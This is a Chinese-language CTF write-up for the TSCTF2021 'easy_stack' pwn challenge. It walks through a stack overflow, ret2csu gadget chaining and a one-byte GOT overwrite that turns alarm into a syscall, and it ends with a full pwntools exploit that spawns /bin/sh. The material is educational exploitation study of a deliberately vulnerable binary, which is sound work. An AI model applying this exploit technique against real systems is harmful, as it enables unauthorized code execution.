TSCTF2021 pwn1 easy_stack

0x00 Pre

TSCTF2021的pwn1，涉及到ret2csu的多次复用和一点点汇编以及syscall的知识

0x01 IDA分析

这题直接没给附件，只有ip，nc 连上去之后是一大段base64乱码，解码保存下是个xz压缩包，解压得到elf文件。

main函数很短，明显的栈溢出。

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[200]; // [rsp+0h] [rbp-D0h]
  __int64 stack_data; // [rsp+C8h] [rbp-8h]

  alarm(0xAu);
  stack_data = 0xDEADBEEFDEADBEEFLL;
  read(0, buf, 0x300uLL);
  if ( stack_1 != 0xDEADBEEFDEADBEEFLL )
    exit(0);
  return 0;
}

栈上布局也很简单：

-00000000000000D0 buf             db 200 dup(?)
-0000000000000008 stack_data      dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)

即只需要在read的时候入读200+8+8个字节，其中覆盖stack_data的时候填入0xDEADBEEFDEADBEEF，就可以控制返回地址。

没有其他函数可以利用，考虑使用 ret2csu

0x02 解题思路

由于需要利用ret2csu，我们先分析下csu段：

.text:0000000000400650                 mov     rdx, r15
.text:0000000000400653                 mov     rsi, r14
.text:0000000000400656                 mov     edi, r13d
.text:0000000000400659                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
.text:000000000040065D                 add     rbx, 1
.text:0000000000400661                 cmp     rbp, rbx
.text:0000000000400664                 jnz     short loc_400650
.text:0000000000400666
.text:0000000000400666 loc_400666:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400666                 add     rsp, 8
.text:000000000040066A                 pop     rbx
.text:000000000040066B                 pop     rbp
.text:000000000040066C                 pop     r12
.text:000000000040066E                 pop     r13
.text:0000000000400670                 pop     r14
.text:0000000000400672                 pop     r15
.text:0000000000400674                 retn

根据ret2csu，我们需要先调用 0x0000000000400666 - 0x0000000000400674来控制寄存器

输入进寄存器的顺序为：pop rbx,rbp,r12,r13,r14,r15，

之后调用```0x0000000000400650``,使rdx = r15 ; rsi = r14 ; edi = r13d ; call [r12+rbx*8]

为了便于控制，我们令rbx = 0 使最后调用call r12 ，这样r12就是我们希望调用的函数。

而64位程序的函数调用时参数依次放入 rdi, rsi, rdx, rcx, r8, r9

即我们利用csu时r13d为第一个参数（edi），r14，r15依次是第二个和第三个参数

这样一个利用csu的大概思路就有了

csu_end_addr = 0x400666
csu_front_addr = 0x400650
def csu(address, arg0, arg1, arg2):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi = edi = r13d =a rg0
    # rsi = r14 = arg1
    # rdx = r15 = arg2
    ret = p64(csu_end_addr) + p64(0)*2 + p64(1) + p64(address) + p64(arg0) +p64(arg1) + p64(arg2)
    ret += p64(csu_front_addr)
    ret += 'a' * 0x38
    return ret

同时我们注意到main函数开头有个alarm函数，了解下alarm函数之后就能发现alarm函数是通过syscall实现的

libc中的alarm：

了解下plt和got机制就能 知道，函数掉用alarm是会先call <alarm@plt>,而在<alarm@plt>中会调用<alarm@got>,

而got表中存放的地址就在libc中，这题我们没有write，没办法得到libc的基地址，但是原程序中的alarm调用会最终调用到libc中的alarm函数处，对libc中的alarm研究就能发现其实如果我们能使<alarm@got>中存放的alarm在libc中的真实地址+5 （即想我这里从原来的指向0x555555638610变成指向0x555555638615，具体数值由于开启了基地址随机保护会不定，但是alarm和syscall的最第三位是一定的）

即我们不需要泄露alarm的got表，只需要直接修改alarm的got使其+5即可使调用alarm时调用syscall函数，

syscall函数调用的时候系统调用号放在 rax 里，其中0x80为system，0x3b为execve。

而read函数正好可以控制 rax 寄存器

ssize_t read(int fd, void * buf, size_t count);
//read()函数尝试从文件描述符fd中读取count个字节到buf开头的缓冲区中。返回读取的字符数到rax

我们一般见到的都是read(0,buf,size),这里fd为0代表标准输入流

即从标准输入流中读取size个字节，将读取到的字符放入buf中，同时返回读取到的字节数到rax寄存器中

这里我们就可以利用read修改rax寄存器以放入系统调用号，顺便修改alarm的got表。

现在我们可以构造payload了：

payload = p64(0xDEADBEEFDEADBEEF)*((200 +8)/8)+p64(0xdeadbeef)
# p64()*(208/8)填满栈，再加一个p64()填充rbp
# 填入stack中使满足if条件满足且填充rbp，劫持ret
payload += csu(elf.got['read'], 0, elf.got['alarm'], 1)
# 从标准输入流0中读取1个字节放到alarm的got表中，然后ret等待下一个调用函数
payload += csu(elf.got['read'], 0, bss_start, 0x3b)   # return 0x3b ==> rax
# 从标准输入流0中读取0x3b个字节放到.bss段中，然后ret等待下一个调用函数
# 这里选择read 0x3b个字节主要再能读取"/bin/sh"的前提下，使read的返回值为0x3b，read的返回值会放入rax中
# 而对syscall来说，调用syscall时要调用的函数的函数调用号就放在rax里，0x3b代表execve函数
payload += csu(elf.got["alarm"], bss_start, 0, 0)
# 调用got表中的alarm函数(实则会由read修改alarm的got表中的内容，这里调用alarm+5的syscall)
# 调用之后第一个参数为.bss段上的内容，接下来将会由第二个read往里写入"/bin/sh"，第二个和第三个参数为0
# 即最终调用execve("/bin/sh",0,0)来getshell
payload = payload.ljust(0x300,"\x00")
# 在main函数中的read读取0x300个字符，这我们在标准输入流中写满0x300个字符，之后这个read函数就会停止接收标准输入流
# 但由于我们的ret2csu，输入完这0x300个字符之后就开始调用我们注入的csu函数
# 首先调用read(0,elf.got['alarm'],1),即输入一个字符写入alarm的got表
payload += p8(0x15) 
# 在标准输入流中输入一个十六进制为0x15的字节，修改alarm的got表
'''
附上我本地libc的alarm真实汇编代码
0x555555638610 <alarm>   : mov eax，0x25
0x555555638615 <alarm+5> : syscall
即alarm的got表中的内容应为0x555555638610（后三位固定）
我们只需要将最后改为0x555555638615，这样函数调用alarm的时候就会调用syscall，即往alarm的got表写入0x15
'''
# 上一个read调用完之后来到下一个csu函数
# read(0, bss_start, 0x3b)
# 在标准输入流中读取0x3b个字符，写入.bss段，故我们需要输入我们需要的"/bin/sh"字符串
payload += "/bin/sh\x00".ljust(0x3b,'\x00') 
# 这样bss段就会写入"/bin/sh"同时由于read返回输入的字节数，我们读入了0x3b个字节，rax寄存器就会被设置成0x3b
# 接着继续调用我们注入的csu函数，即elf.got['alarm']
# 而由于我们的修改alarm的got表指向syscall，此时调用syscall会调用rax寄存器里函数调用号所代表的函数
# 上一个read的返回值使rax此时的值为0x3b，在64位系统中代表execve
# 即此时调用execve(bss_start, 0, 0),由于我们往bss_start填入了"/bin/sh"
# 故最终调用execve("/bin/sh", 0, 0)
p.send(payload)
# getshell!

0x03 exp

# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
p = process("./test")
elf = ELF("./test")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

csu_end_addr = 0x400666
csu_front_addr = 0x400650
bss_start = 0x601040

def csu(address, arg0, arg1, arg2):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r13d=arg0
    # rsi=r14=arg1
    # rdx=r15=arg2
    ret = p64(csu_end_addr) + p64(0)*2 + p64(1) + p64(address) + p64(arg0) +p64(arg1) + p64(arg2)
    ret += p64(csu_front_addr)
    ret += 'a' * 0x38
    return ret

payload = p64(0xDEADBEEFDEADBEEF)*((200 +8)/8)+p64(0xdeadbeef)
payload += csu(elf.got['read'], 0, elf.got['alarm'], 1)
payload += csu(elf.got['read'], 0, bss_start, 0x3b)   # return 0x3b ==> rax
payload += csu(elf.got["alarm"], bss_start, 0, 0)

payload = payload.ljust(0x300,"\x00")
payload += p8(0x15)
payload += "/bin/sh\x00".ljust(0x3b,'\x00') 
p.send(payload)

p.interactive()
# pwn # python2 # ctf
